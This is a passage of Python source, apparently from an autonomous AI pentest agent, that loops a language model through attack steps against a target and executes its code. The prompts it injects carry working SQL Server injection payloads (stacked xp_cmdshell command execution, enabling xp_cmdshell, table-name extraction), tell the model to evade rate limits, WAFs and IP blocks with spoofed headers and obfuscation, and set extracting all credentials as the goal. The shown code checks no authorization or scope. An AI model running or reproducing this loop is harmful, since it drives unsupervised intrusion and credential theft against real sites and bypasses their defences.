                        "=== SKILL CONTENT INJECTED (use this expert knowledge) ===\n"
                        + skill_content
                        + "\n=== END SKILLS ===\n"
                        "Now continue with the task using this expert knowledge. "
                        "Do NOT declare SKILL_LOAD again for already-loaded skills: "
                        + ", ".join(_loaded_skills)
                    )
                ))
                model_cfg = self.config.get_active_model_config()
                if model_cfg:
                    model = ModelRegistry.build(model_cfg)
                    self.console.print(
                        f"\n[bold cyan]⚡ {self.s.get('skill_applying', 'Applying skill knowledge...')} "
                        f"[{', '.join(new_skills)}][/bold cyan]"
                    )
                    new_response = self._stream_response(
                        model.chat_stream(self._build_messages(""))
                    )
                    self.history.append(Message(role="assistant", content=new_response))
                    if "```" in new_response:
                        self._execute_ai_commands(new_response, _depth=_depth + 1, _loaded_skills=_loaded_skills)
                    return

        # ── 메인 에이전트 루프 (while — 재귀 없음) ────────────────────
        current_response = response
        _no_code_retry = 0  # AI가 코드 없이 텍스트만 보낸 횟수

        while True:
            # 코드 블록 없으면 → AI에게 코드 작성 재촉 (최대 3회)
            if "```" not in current_response:
                if _no_code_retry >= 3:
                    # 3회 재촉해도 코드 없으면 진짜 완료로 판단
                    self._auto_generate_report()
                    break
                _no_code_retry += 1
                _lang = getattr(self.config, "lang", "en")
                _nudge = {
                    "ko": "분석을 계속하려면 반드시 ```python 코드 블록을 포함해야 합니다. 다음 공격 단계의 코드를 즉시 작성하세요.",
                    "zh": "要继续分析，必须包含 ```python 代码块。请立即编写下一步攻击代码。",
                    "en": "To continue, you MUST include a ```python code block. Write the next attack step code NOW.",
                }.get(_lang, "Write the next ```python code block NOW to continue.")
                self.history.append(Message(role="user", content=f"[CONTINUE REQUIRED]\n{_nudge}"))
                from ..models.registry import ModelRegistry as _MR
                _mc = self.config.get_active_model_config()
                if not _mc:
                    break
                _m = _MR.build(_mc)
                current_response = self._stream_response(_m.chat_stream(self._build_messages("")))
                if current_response:
                    self.history.append(Message(role="assistant", content=current_response))
                continue

            _no_code_retry = 0  # 코드 있으면 카운터 리셋

            # 코드 실행
            results_text = self._run_code_blocks(current_response, _loaded_skills)

            # ── 환각 감지 (HTTP 응답 지표 없는 출력) ─────────────────────────
            _real_http_indicators = [
                "200", "201", "301", "302", "400", "401", "403", "404", "500",
                "HTTP/", "Content-", "text/html", "application/json",
                "Server:", "Set-Cookie", "Location:", "charset",
                "status_code", "STATUS", "<!DOCTYPE", "<html",
            ]
            def _has_real_http_output(outputs: list[str]) -> bool:
                combined = " ".join(outputs).lower()
                return any(ind.lower() in combined for ind in _real_http_indicators)

            if results_text:
                # 환각 차단 메시지 포함됐을 때 (JSON 코드블록)
                _is_all_hallucination_blocks = all(
                    "HALLUCINATION DETECTED" in r or "ALL CODE BLOCKS REJECTED" in r
                    for r in results_text
                )
                # 실제 HTTP 출력 전혀 없고 결과가 너무 짧음
                _all_very_short = all(len(r.strip()) < 200 for r in results_text)
                _no_real_http = not _has_real_http_output(results_text)

                if _is_all_hallucination_blocks or (_all_very_short and _no_real_http):
                    _lang = getattr(self.config, "lang", "en")
                    _force_rewrite = {
                        "ko": (
                            "[⛔ 환각 코드 감지 — 즉시 재작성 필요]\n"
                            "작성한 코드에서 실제 HTTP 응답이 없습니다.\n"
                            "반드시 아래 형식으로 코드를 다시 작성하세요:\n\n"
                            "```python\n"
                            "import requests\n"
                            "url = 'https://TARGET/실제경로'\n"
                            "r = requests.get(url, timeout=10, verify=False,\n"
                            "    headers={'User-Agent': 'Mozilla/5.0'})\n"
                            "print(f'[STATUS] {r.status_code}  {url}')\n"
                            "print(r.text[:500])\n"
                            "```\n"
                            "JSON 딕셔너리({...})나 가짜 출력은 절대 사용 금지."
                        ),
                        "zh": (
                            "[⛔ 检测到幻觉代码 — 必须立即重写]\n"
                            "您的代码没有产生真实的HTTP响应。\n"
                            "必须按以下格式重写所有代码块:\n\n"
                            "```python\n"
                            "import requests\n"
                            "url = 'https://TARGET/真实路径'\n"
                            "r = requests.get(url, timeout=10, verify=False,\n"
                            "    headers={'User-Agent': 'Mozilla/5.0'})\n"
                            "print(f'[STATUS] {r.status_code}  {url}')\n"
                            "print(r.text[:500])\n"
                            "```\n"
                            "禁止使用JSON字典({...})或伪造输出。"
                        ),
                        "en": (
                            "[⛔ HALLUCINATION CODE DETECTED — REWRITE REQUIRED]\n"
                            "Your code produced NO real HTTP responses.\n"
                            "You MUST rewrite ALL code blocks like this:\n\n"
                            "```python\n"
                            "import requests\n"
                            "url = 'https://TARGET/real-path'\n"
                            "r = requests.get(url, timeout=10, verify=False,\n"
                            "    headers={'User-Agent': 'Mozilla/5.0'})\n"
                            "print(f'[STATUS] {r.status_code}  {url}')\n"
                            "print(r.text[:500])\n"
                            "```\n"
                            "FORBIDDEN: JSON dicts ({...}), fake output, simulation code."
                        ),
                    }.get(_lang, "Rewrite with real requests.get/post code NOW.")
                    self.history.append(Message(role="user", content=_force_rewrite))
                    from ..models.registry import ModelRegistry as _MR_hall
                    _mc_hall = self.config.get_active_model_config()
                    if not _mc_hall:
                        break
                    _m_hall = _MR_hall.build(_mc_hall)
                    current_response = self._stream_response(_m_hall.chat_stream(self._build_messages("")))
                    if current_response:
                        self.history.append(Message(role="assistant", content=current_response))
                    continue

            if not results_text:
                # 코드 블록은 있었지만 실행 결과 없음 → AI에게 알리고 계속
                _lang = getattr(self.config, "lang", "en")
                _no_output_msg = {
                    "ko": (
                        "[⛔ 스크립트 출력 없음 — 환각 코드 의심]\n"
                        "스크립트가 실행됐지만 출력이 없습니다. "
                        "코드에 실제 HTTP 요청(requests.get/post)이 없거나 JSON만 있습니다.\n"
                        "반드시 requests.get(url)을 호출하고 print(r.status_code, r.text[:300])을 추가하세요."
                    ),
                    "zh": (
                        "[⛔ 脚本无输出 — 疑似幻觉代码]\n"
                        "脚本执行但没有输出。代码中缺少真实HTTP请求或只包含JSON。\n"
                        "必须调用requests.get(url)并添加print(r.status_code, r.text[:300])。"
                    ),
                    "en": (
                        "[⛔ SCRIPT NO OUTPUT — HALLUCINATION SUSPECTED]\n"
                        "Script ran but produced ZERO output. "
                        "Your code has no real HTTP calls or contains only JSON.\n"
                        "Add: r = requests.get(url); print(r.status_code); print(r.text[:300])"
                    ),
                }.get(_lang, "Script produced no output. Add requests.get() and print(r.status_code).")
                self.history.append(Message(role="user", content=f"[EXECUTION RESULT]\n{_no_output_msg}"))
                model_cfg2 = self.config.get_active_model_config()
                if not model_cfg2:
                    break
                from ..models.registry import ModelRegistry as _MR2
                _m2 = _MR2.build(model_cfg2)
                current_response = self._stream_response(_m2.chat_stream(self._build_messages("")))
                if current_response:
                    self.history.append(Message(role="assistant", content=current_response))
                continue

            # 롤백 스냅샷
            self._rollback.save(
                agent_state=self._agent_state,
                history_len=len(self.history),
                label=f"Loop #{self._exec_loop_count} — {(self._agent_state.get('target') or '?')[:40]}",
            )

            # 결과 압축 (컨텍스트 폭발 방지)
            raw_results = "\n".join(results_text)
            # /retry 를 위해 마지막 실행 결과 보존
            self._last_exec_result = raw_results
            if len(raw_results) > 3000:
                trimmed = (
                    raw_results[:1500]
                    + f"\n\n[... {len(raw_results) - 3000} chars trimmed ...]\n\n"
                    + raw_results[-1500:]
                )
            else:
                trimmed = raw_results

            # 히스토리 슬라이딩 윈도우
            non_system = [m for m in self.history if m.role != "system"]
            if len(non_system) > 20:
                system_msgs = [m for m in self.history if m.role == "system"]
                self.history = system_msgs + non_system[-16:]

            self._parse_agent_state(raw_results)
            state_summary = self._format_agent_state()
            self._show_token_usage()
            self._exec_loop_count += 1
            # 루프마다 세션 자동 저장 (이어하기용)
            self._save_history()

            # ── IP 차단 / Rate Limit 자동 감지 및 대기 ────────────────────
            _ip_block_hint = ""
            _raw_lower = raw_results.lower()
            _ip_block_signals = [
                ("429", "Rate limit (429) detected"),
                ("too many requests", "Too Many Requests"),
                ("rate limit", "Rate limit hit"),
                ("403 forbidden", "403 Forbidden — possible IP block"),
                ("503 service", "503 Service Unavailable"),
                ("connection refused", "Connection refused"),
                ("connection reset", "Connection reset"),
                ("timed out", "Request timeout — possible WAF silent drop"),
                ("readtimeout", "ReadTimeout — WAF silent drop"),
                ("connecttimeout", "ConnectTimeout — server/WAF blocking"),
                ("blocked", "Block detected"),
                ("captcha", "CAPTCHA detected"),
                ("banned", "Possible IP ban"),
                ("access denied", "Access denied"),
                ("temporarily unavailable", "Temporarily unavailable"),
            ]
            _detected_blocks = [label for sig, label in _ip_block_signals if sig in _raw_lower]

            # VBScript 에러 감지 — SQL 인젝션 시도 중단 신호
            _vbscript_no_sqli_patterns = [
                ("800a01a8", "VBScript Error 800a01a8 (Object required — NOT SQLi)"),
                ("800a0d5d", "VBScript Error 800a0d5d (ADODB Type mismatch — PARAMETERIZED, NOT injectable)"),
                ("8002000a", "VBScript Error 8002000a (ADO stream error — NOT SQLi)"),
                ("800a000d", "VBScript Error 800a000d (Type mismatch — NOT SQLi)"),
            ]
            _vbscript_signals = [
                label for sig, label in _vbscript_no_sqli_patterns if sig in _raw_lower
            ]
            # 진짜 OLE DB SQL 에러 패턴 — 이것들이 있으면 VBScript 경고 억제
            # (같은 배치 결과에 두 종류가 섞여 있을 수 있음)
            _real_sqli_sigs = ["80040e14", "80040e07", "80040e01", "80040e21", "80040e23"]
            _has_real_sqli_err = any(sig in _raw_lower for sig in _real_sqli_sigs)

            if _vbscript_signals and not _has_real_sqli_err:
                # 진짜 SQL 에러 없음 → 순수 VBScript 파라미터화된 에러 → 경고 출력
                _vb_title = t("vbscript_not_sqli_title", "⚠️  VBScript error detected — these parameters are NOT SQL injectable")
                _vb_detail = t("vbscript_not_sqli_detail", "Detected: {signals}\n→ NOT injectable\n→ STOP testing this parameter.").replace("{signals}", ", ".join(_vbscript_signals[:2]))
                self.console.print(f"[{THEME['warn']}]{_vb_title}[/]")
                self.console.print(f"[{THEME['dim']}]{_vb_detail}[/]")
                _ip_block_hint += (
                    f"\n[VBSCRIPT_ERROR_DETECTED: {'; '.join(_vbscript_signals)}]\n"
                    "ACTION REQUIRED: STOP testing these parameters for SQL injection.\n"
                    "  - Error 800a01a8 = Object required (VBScript logic error, not SQLi)\n"
                    "  - Error 800a0d5d = ADODB type mismatch = PARAMETERIZED QUERY = NOT injectable\n"
                    "  - Error 8002000a = ADO stream error = NOT SQLi\n"
                    "Mark these parameters as SAFE / PARAMETERIZED and move to different endpoints.\n"
                    "Do NOT waste more loops on these VBScript errors.\n"
                )
            elif _vbscript_signals and _has_real_sqli_err:
                # 같은 배치에 VBScript 에러 + 진짜 OLE DB SQL 에러 혼재
                # → VBScript 경고 억제, AI에게 혼합 결과임을 알림
                _ip_block_hint += (
                    "\n[MIXED_SQLI_RESULT: VBScript errors AND real OLE DB SQL errors both present]\n"
                    "INTERPRETATION: Different parameters have different injection status.\n"
                    "  - Parameters triggering 800a01a8/800a0d5d → parameterized → NOT injectable\n"
                    "  - Parameters triggering 80040e14/80040e07 → REAL SQL error → INJECTABLE!\n"
                    "FOCUS on the parameters that returned 80040e14 or 80040e07 errors.\n"
                    "DO NOT apply VBScript 'stop testing' rule to the 80040e1x parameters.\n"
                )

            # ADODB 800a0cc1 감지 — Stacked Query 실행 가능 신호
            if "800a0cc1" in _raw_lower:
                _stacked_msg = t("stacked_query_detected", "⚡ ADODB 800a0cc1 detected — stacked query executing!")
                self.console.print(f"[bold green]{_stacked_msg}[/]")
                _ip_block_hint += (
                    "\n[STACKED_QUERY_OPPORTUNITY: ADODB 800a0cc1 detected]\n"
                    "CRITICAL: Semicolon-stacked queries ARE executing on this endpoint!\n"
                    "The 800a0cc1 error = ADO tried to read a column from a SELECT result but failed.\n"
                    "This means the second statement ran but returned an unexpected recordset.\n"
                    "NEXT STEPS:\n"
                    "  1. Try side-effect stacked queries (no SELECT result needed):\n"
                    "     payload = '4; EXEC master..xp_cmdshell 0x77686f616d69--'\n"
                    "     payload = '4; INSERT INTO #tmp SELECT @@version--'\n"
                    "  2. If xp_cmdshell disabled, try enabling:\n"
                    "     payload = '4; EXEC sp_configure 0x73686f77206164...,1; RECONFIGURE--'\n"
                    "  3. Use error-based to extract from stacked: CAST(@@version AS int)\n"
                    "DO NOT use SELECT in stacked queries — it causes the 800a0cc1 recordset error.\n"
                )

            # 무한 루프 경고 — 같은 테이블 이름이 반복 출력 감지
            _lines = trimmed.split("\n")
            _table_lines = [l.strip() for l in _lines if l.strip() and not l.startswith("[") and not l.startswith("⏱") and not l.startswith("=") and not l.startswith("步") and not l.startswith("表")]
            if len(_table_lines) >= 6:
                _last_five = _table_lines[-5:]
                if len(set(_last_five)) == 1:  # 마지막 5줄이 모두 동일
                    _dup_val = _last_five[0]
                    _dup_msg = t("infinite_loop_warning", "⚠️  Infinite loop detected — '{name}' repeated {n}+ times.").replace("{name}", _dup_val).replace("{n}", "5")
                    self.console.print(f"[bold red]{_dup_msg}[/]")
                    _ip_block_hint += (
                        f"\n[INFINITE_LOOP_DETECTED: same result '{_dup_val}' repeating]\n"
                        "CRITICAL BUG IN YOUR SCRIPT: You are getting the same result in a loop!\n"
                        "ROOT CAUSE: SELECT TOP 1 without pagination cursor always returns first row.\n"
                        "MANDATORY FIX — Use cursor pagination:\n"
                        "  seen = set()\n"
                        "  last_hex = ''\n"
                        "  while True:\n"
                        "      if last_hex:\n"
                        "          payload = f'AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55 AND name > {last_hex})'\n"
                        "      else:\n"
                        "          payload = 'AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55)'\n"
                        "      result = extract(payload)\n"
                        "      if not result or result in seen: break\n"
                        "      seen.add(result)\n"
                        "      last_hex = '0x' + result.encode().hex().upper()\n"
                        "      print(result)\n"
                        "STOP the current loop immediately and rewrite with this pattern.\n"
                    )

            if _detected_blocks:
                _wait_secs = 15
                # 타임아웃만 감지된 경우 WAF 드롭으로 명시
                _is_timeout_only = all("timeout" in b.lower() or "drop" in b.lower() for b in _detected_blocks)
                if _is_timeout_only:
                    _wait_secs = 5  # 타임아웃은 짧게 대기

                _lang = getattr(self.config, "lang", "en")
                _block_msg = {
                    "ko": f"⛔ 차단 감지: {', '.join(_detected_blocks)} — {_wait_secs}초 대기 후 재시도...",
                    "zh": f"⛔ 检测到封锁: {', '.join(_detected_blocks)} — 等待 {_wait_secs} 秒后重试...",
                    "en": f"⛔ Block detected: {', '.join(_detected_blocks)} — waiting {_wait_secs}s before retry...",
                }.get(_lang, f"⛔ Block detected — waiting {_wait_secs}s...")
                self.console.print(f"[{THEME['warn']}]{_block_msg}[/]")
                import time as _time
                # 대기 중 카운트다운 표시
                for _i in range(_wait_secs, 0, -5):
                    _time.sleep(min(5, _i))
                    self.console.print(f"[{THEME['dim']}]  {self.s.get('countdown_remain', '⏱ {sec}s remaining...').format(sec=_i)}[/]")
                _ip_block_hint = (
                    f"\n[IP_BLOCK_DETECTED: {', '.join(_detected_blocks)}]\n"
                    f"Waited {_wait_secs}s. Now retry with:\n"
                    f"  - Different User-Agent string\n"
                    f"  - X-Forwarded-For: 8.8.8.8 header\n"
                    f"  - Reduce request rate (add time.sleep(2) between requests)\n"
                    f"  - If timeout/WAF-drop: try chunked Transfer-Encoding or smaller payloads\n"
                    f"  - Try a different endpoint or parameter\n"
                    f"  - If CAPTCHA: look for API endpoint that bypasses frontend\n"
                )

            injection = (
                "=== BINGO REAL EXECUTION RESULTS ===\n"
                + trimmed
                + _ip_block_hint
                + "\n=== END REAL RESULTS ===\n\n"
                + state_summary
                + "NEXT ACTION: Continue from where you left off. "
                "DO NOT re-extract already known facts above. "
                "Proceed to the next unknown step.\n"
                "- If WAF blocks: use obfuscation variants\n"
                "- Output TASK_COMPLETE when all credentials are extracted\n"
                "- NEVER generate simulated output"
            )
            self.history.append(Message(role="user", content=injection))

            model_cfg = self.config.get_active_model_config()
            if not model_cfg:
                break

            _s = self.s

            # Ctrl+C 체크 — 힌트 주입 후 계속 가능
            if self._agent_stop_flag.is_set():
                self._agent_stop_flag.clear()
                _hint = self._prompt_mid_task_hint()
                if _hint:
                    # 힌트를 히스토리에 주입하고 루프 계속
                    _lang = getattr(self.config, "lang", "en")
                    _hint_injected = {
                        "ko": f"[사용자 힌트 — 즉시 반영]: {_hint}",
                        "zh": f"[用户提示 — 立即应用]: {_hint}",
                        "en": f"[USER HINT — apply immediately]: {_hint}",
                    }.get(_lang, f"[USER HINT]: {_hint}")
                    self.history.append(Message(role="user", content=_hint_injected))
                    _resume_msg = {
                        "ko": f"💬 힌트 주입됨 — 루프 재개 (#{self._exec_loop_count})",
                        "zh": f"💬 提示已注入 — 继续循环 (#{self._exec_loop_count})",
                        "en": f"💬 Hint injected — resuming loop (#{self._exec_loop_count})",
                    }.get(_lang, f"💬 Hint injected — resuming")
                    self.console.print(f"[{THEME['success']}]{_resume_msg}[/]\n")
                    # 다음 AI 호출 전까지 결과 주입 없이 바로 AI에게 힌트 전달
                    model_hint = ModelRegistry.build(model_cfg)
                    _hint_response = self._stream_response(
                        model_hint.chat_stream(self._build_messages(""))
                    )
                    if _hint_response:
                        self.history.append(Message(role="assistant", content=_hint_response))
                        self._append_to_session_log("assistant", _hint_response)
                        # ★ current_response 업데이트 — 힌트 기반 AI 응답을 다음 루프에서 처리
                        current_response = _hint_response
                    continue
                else:
                    self.console.print(f"\n[{THEME['warn']}]⚠ {_s.get('agent_interrupted', 'Agent loop interrupted')}[/]\n")
                    self._suggest_next_steps()
                    break

            # AI 피드백
            model = ModelRegistry.build(model_cfg)
            self.console.print(f"\n[{THEME['secondary']}]{_s['exec_analyzing']}[/]")
            followup_response = self._stream_response(
                model.chat_stream(self._build_messages(""))
            )

            if not followup_response:
                # API 응답 없음 → 잠시 대기 후 재시도
                import time as _t
                _t.sleep(3)
                model_cfg3 = self.config.get_active_model_config()
                if not model_cfg3:
                    break
                from ..models.registry import ModelRegistry as _MR3
                _m3 = _MR3.build(model_cfg3)
                followup_response = self._stream_response(
                    _m3.chat_stream(self._build_messages(""))
                )
                if not followup_response:
                    break  # 재시도도 실패하면 종료

            self.history.append(Message(role="assistant", content=followup_response))
            self._append_to_session_log("assistant", followup_response)
            self._notify_hashes_found(followup_response)

            # 작업 완료
            if "TASK_COMPLETE" in followup_response or "MISSION_COMPLETE" in followup_response:
                self.console.print(f"\n[{THEME['success']}]✅ {_s.get('agent_done', 'Agent task complete')}[/]\n")
                _target = self._agent_state.get("target", "target")
                _lang = getattr(self.config, "lang", "en")
                _notif_title = {"ko": "BINGO — 작업 완료", "zh": "BINGO — 任务完成", "en": "BINGO — Task Complete"}.get(_lang, "BINGO — Done")
                _notif_body = {"ko": f"침투 테스트 완료: {_target[:40]}", "zh": f"渗透测试完成: {_target[:40]}", "en": f"Pentest complete: {_target[:40]}"}.get(_lang, f"Done: {_target[:40]}")
                self._send_notification(_notif_title, _notif_body, critical=False)
                self._auto_generate_report()
                break

            # 타겟 실패 감지 — 더 이상 진행 불가
            if "TARGET_FAILED" in followup_response:
                _lang = getattr(self.config, "lang", "en")
                _fail_msg = {
                    "ko": "❌ 타겟 공략 실패 — 이 타겟에서는 취약점을 확인할 수 없습니다.",
                    "zh": "❌ 目标攻击失败 — 无法在此目标上确认漏洞。",
                    "en": "❌ Target failed — no confirmed vulnerability on this target.",
                }.get(_lang, "❌ Target failed.")
                _next_msg = {
                    "ko": "다른 URL/파라미터 또는 다른 타겟 도메인을 시도하세요.",
                    "zh": "请尝试不同的URL/参数或其他目标域名。",
                    "en": "Try a different URL/parameter or a different target domain.",
                }.get(_lang, "Try a different target.")
                from rich.panel import Panel as _Panel
                self.console.print(_Panel(
                    f"{_fail_msg}\n\n{_next_msg}",
                    title=f"[bold red]TARGET_FAILED[/bold red]",
                    border_style="red",
                ))
                self._auto_generate_report()
                break

            # Ctrl+C (응답 후) — 힌트 주입 후 계속 가능
            if self._agent_stop_flag.is_set():
                self._agent_stop_flag.clear()
                _hint2 = self._prompt_mid_task_hint()
                if _hint2:
                    _lang = getattr(self.config, "lang", "en")
                    _hint_injected2 = {
                        "ko": f"[사용자 힌트 — 즉시 반영]: {_hint2}",
                        "zh": f"[用户提示 — 立即应用]: {_hint2}",
                        "en": f"[USER HINT — apply immediately]: {_hint2}",
                    }.get(_lang, f"[USER HINT]: {_hint2}")
                    self.history.append(Message(role="user", content=_hint_injected2))
                    _resume_msg2 = {
                        "ko": f"💬 힌트 주입됨 — 루프 재개 (#{self._exec_loop_count})",
                        "zh": f"💬 提示已注入 — 继续循环 (#{self._exec_loop_count})",
                        "en": f"💬 Hint injected — resuming loop (#{self._exec_loop_count})",
                    }.get(_lang, f"💬 Hint injected — resuming")
                    self.console.print(f"[{THEME['success']}]{_resume_msg2}[/]\n")
                    # ★ 힌트 기반 AI 호출 — 새 응답을 current_response로 설정해야 루프가 올바르게 진행됨
                    model_hint2 = ModelRegistry.build(model_cfg)
                    self.console.print(f"\n[{THEME['secondary']}]{_s['exec_analyzing']}[/]")
                    _hint2_response = self._stream_response(
                        model_hint2.chat_stream(self._build_messages(""))
                    )
                    if _hint2_response:
                        self.history.append(Message(role="assistant", content=_hint2_response))
                        self._append_to_session_log("assistant", _hint2_response)
                        current_response = _hint2_response  # ★ current_response 업데이트 필수
                    continue
                else:
                    self.console.print(f"\n[{THEME['warn']}]⚠ {_s.get('agent_interrupted', 'Agent loop interrupted')}[/]\n")
                    self._auto_generate_report()
                    break

            # Stuck 감지 — 최근 5루프 중 3개 동일하면 전략 전환, 5개 전부 동일하면 보고서 후 종료
            _result_hash = str(hash(followup_response[:500]))
            self._recent_results.append(_result_hash)
            if len(self._recent_results) > 5:
                self._recent_results.pop(0)

            _last5 = self._recent_results
            _is_hard_stuck = len(_last5) >= 5 and len(set(_last5)) == 1
            _is_soft_stuck = len(_last5) >= 3 and len(set(_last5[-3:])) == 1

            if _is_hard_stuck:
                # 5루프 전부 동일 → 더 이상 진전 불가, 보고서 생성 후 종료
                self.console.print(
                    f"\n[{THEME['warn']}]⚠ {_s.get('agent_stuck', 'Agent stuck — generating report')}...[/]\n"
                )
                self._auto_generate_report()
                self._stuck_count = 0
                self._recent_results.clear()
                break
            elif _is_soft_stuck:
                self._stuck_count += 1
                # 전략 전환 요청 — 루프는 계속
                self.history.append(Message(
                    role="user",
                    content=(
                        "[STRATEGY CHANGE REQUIRED]\n"
                        "The last 3 loops produced identical results — you are STUCK.\n"
                        "You MUST switch to a completely different attack vector:\n"
                        "- If WAF blocked all SQL: try Time-based, different param, or header injection\n"
                        "- If no SQLi: pivot to XSS, LFI, IDOR, or auth bypass\n"
                        "- If stuck on extraction: try a shorter query or different encoding\n"
                        "Make a decisive pivot NOW. Do NOT repeat the same payload."
                    )
                ))
            else:
                self._stuck_count = 0

            # 루프 상태 표시 (횟수 제한 없음 — AI 자율 완료 판단)
            self.console.print(
                f"[{THEME['dim']}]🔄 {_s.get('agent_loop', 'Agent loop')} "
                f"#{self._exec_loop_count}  "
                f"({_s.get('agent_ctrl_c', 'Ctrl+C to stop')})[/]"
            )

            # 스킬 로드 체크 (followup에 새 SKILL_LOAD 있으면 주입)
            new_skill_names = self._parse_skill_load_request(followup_response)
            new_new_skills = [s for s in new_skill_names if s not in _loaded_skills]
            if new_new_skills:
                _loaded_skills.update(new_new_skills)
                skill_content = self._load_skill_content(new_new_skills)
                if skill_content:
                    self.history.append(Message(
                        role="user",
                        content=(
                            "=== SKILL CONTENT INJECTED ===\n"
                            + skill_content
                            + "\n=== END SKILLS ===\n"
                            "Continue using this expert knowledge. "
                            "Do NOT redeclare loaded skills: "
                            + ", ".join(_loaded_skills)
                        )
                    ))
                    skill_model = ModelRegistry.build(model_cfg)
                    self.console.print(
                        f"\n[bold cyan]⚡ {_s.get('skill_applying', 'Applying skill...')} "
                        f"[{', '.join(new_new_skills)}][/bold cyan]"
                    )
                    followup_response = self._stream_response(
                        skill_model.chat_stream(self._build_messages(""))
                    )
                    self.history.append(Message(role="assistant", content=followup_response))

            current_response = followup_response

    def _auto_generate_report(self) -> None:
        """작업 완료/중단 시 지금까지 발견한 내용을 자동으로 마크다운 보고서로 저장."""
        from ..models.registry import ModelRegistry
        from rich.rule import Rule
        from pathlib import Path
        import datetime

        model_cfg = self.config.get_active_model_config()
        if not model_cfg:
            return

        _lang = getattr(self.config, "lang", "en")
        _lang_label = {"ko": "Korean", "zh": "Chinese (Simplified)", "en": "English"}.get(_lang, "English")
        _state = self._agent_state
        target = _state.get("target", "unknown")

        # 보고서 저장 경로 — BINGO_REPORTS_DIR 환경변수 우선, 없으면 기본값
        import os as _os_report
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_target = (target or "unknown").replace("https://", "").replace("http://", "").replace("/", "_")[:30]
        _env_dir = _os_report.environ.get("BINGO_REPORTS_DIR", "").strip()
        if _env_dir:
            report_dir = Path(_env_dir)
        else:
            report_dir = Path.home() / ".config" / "bingo" / "reports"
        try:
            report_dir.mkdir(parents=True, exist_ok=True)
        except Exception as _mkdir_err:
            # 경로 생성 실패 → 현재 디렉토리 fallback
            self.console.print(
                f"[{THEME['warn']}]⚠ Cannot create report dir {report_dir}: {_mkdir_err} → using current dir[/]"
            )
            report_dir = Path.cwd()
        report_path = report_dir / f"report_{safe_target}_{ts}.md"

        # 저장 경로 미리 출력 — 사용자가 어디 저장되는지 알 수 있게
        self.console.print(
            f"\n[{THEME['warn']}]📁 REPORT SAVE PATH:\n"
            f"   [bold white]{report_path.absolute()}[/bold white]\n"
            f"   (set BINGO_REPORTS_DIR env var to change location)[/]\n"
        )

        # AI에게 보고서 생성 요청 (히스토리 오염 없이)
        last_assistant_msgs = [
            m.content for m in self.history[-12:] if m.role == "assistant"
        ]
        context = "\n\n---\n\n".join(last_assistant_msgs[-4:])[:3000]

        _s = self.s
        _sec = {
            "summary":  {"ko": "요약",           "zh": "摘要",           "en": "Summary"},
            "vulns":    {"ko": "발견된 취약점",   "zh": "发现的漏洞",     "en": "Vulnerabilities Found"},
            "evidence": {"ko": "증거 (페이로드)", "zh": "证据（载荷）",   "en": "Evidence (Payloads)"},
            "creds":    {"ko": "추출된 자격증명", "zh": "提取的凭据",     "en": "Credentials Extracted"},
            "fix":      {"ko": "권고 조치",       "zh": "修复建议",       "en": "Recommended Fix"},
        }
        def _h(key): return _sec[key].get(_lang, _sec[key]["en"])

        prompt_msg = Message(
            role="user",
            content=(
                f"[GENERATE FINAL PENTEST REPORT]\n\n"
                f"Target: {target}\n"
                f"Known state: {_state}\n\n"
                f"Recent findings:\n{context}\n\n"
                f"Write a concise penetration test report in {_lang_label}.\n"
                f"Use EXACTLY these section headers:\n"
                f"# Target: {target}\n"
                f"## {_h('summary')}\n"
                f"## {_h('vulns')} (severity: Critical/High/Medium/Low)\n"
                f"## {_h('evidence')}\n"
                f"## {_h('creds')}\n"
                f"## {_h('fix')}\n\n"
                f"NO code blocks. Plain markdown only. Be concise."
            )
        )

        temp_messages = [self._get_system_message("")] + self.history[-8:] + [prompt_msg]

        self.console.print(Rule(
            f"[bold green]📋 {self.s.get('report_generating', 'Generating report')}[/bold green]",
            style="green"
        ))

        try:
            model = ModelRegistry.build(model_cfg)
            full = ""
            self.console.print(f"\n[{THEME['secondary']}]bingo[/] [{THEME['dim']}]▸[/]", end=" ")

            with Live(console=self.console, refresh_per_second=15, transient=True) as live:
                from rich.text import Text as _Text
                for chunk in model.chat_stream(temp_messages):
                    if chunk.error:
                        live.stop()
                        self._error(chunk.error)
                        return
                    if chunk.text:
                        full += chunk.text
                        live.update(_Text(full, style="white"))

            if full.strip():
                self.console.print()
                from rich.markup import escape as _esc
                from rich.panel import Panel as _Panel
                self.console.print(_Panel(
                    _esc(full.strip()),
                    title=f"[bold green]📋 {self.s.get('report_saved', 'Report')}[/bold green]",
                    border_style="green",
                    padding=(1, 2),
                ))
                # 파일로 저장
                report_path.write_text(full.strip(), encoding="utf-8")
                self.console.print(
                    f"\n[{THEME['success']}]"
                    f"╔══════════════════════════════════════════════════╗\n"
                    f"║  💾 REPORT SAVED SUCCESSFULLY                    ║\n"
                    f"╠══════════════════════════════════════════════════╣\n"
                    f"║  PATH: [bold]{str(report_path.absolute())[:46]}[/bold]\n"
                    f"╚══════════════════════════════════════════════════╝"
                    f"[/]\n"
                )
                self.console.print(
                    f"[{THEME['success']}]  Full path: [bold white]{report_path.absolute()}[/bold white][/]\n"
                )
                # ── 보고서 직후 인터랙티브 다음 단계 선택지 표시 ────
                self._suggest_next_steps()

        except Exception as e:
            self._error(f"report error: {e}")

    def _suggest_next_steps(self) -> None:
        """Agent 루프 중단/보고서 생성 후 AI가 현황 요약 + 선택지 3~5개를 제시한다.
        사용자가 번호를 입력하면 해당 선택지를 자동으로 실행 (인터랙티브).
        히스토리를 오염시키지 않고 전용 패널로 시각적으로 구분해서 표시.
        """
        import re
        from ..models.registry import ModelRegistry
        from rich.panel import Panel as _Panel
        from rich.rule import Rule
        from rich.table import Table as _Table

        model_cfg = self.config.get_active_model_config()
        if not model_cfg:
            return

        _lang = getattr(self.config, "lang", "en")
        _lang_label = {"ko": "Korean", "zh": "Chinese (Simplified)", "en": "English"}.get(_lang, "English")

        _state = self._agent_state
        last_ai_msgs = [
            m.content for m in self.history[-6:]
            if m.role == "assistant"
        ]
        recent_context = "\n---\n".join(last_ai_msgs[-2:])[:2000] if last_ai_msgs else ""

        _s = self.s
        _summary_label = _s.get("progress_summary", "Summary")
        _options_label  = _s.get("next_steps_title", "Next Options")
        _option_hint = {
            "ko": "구체적인 bingo 입력 명령어 또는 지시문",
            "zh": "具体的 bingo 输入指令或说明",
            "en": "exact bingo command or instruction",
        }.get(_lang, "exact command")

        # 아직 수행하지 않은 공격 항목 추출 (컨텍스트 힌트)
        _untested_hint = {
            "ko": (
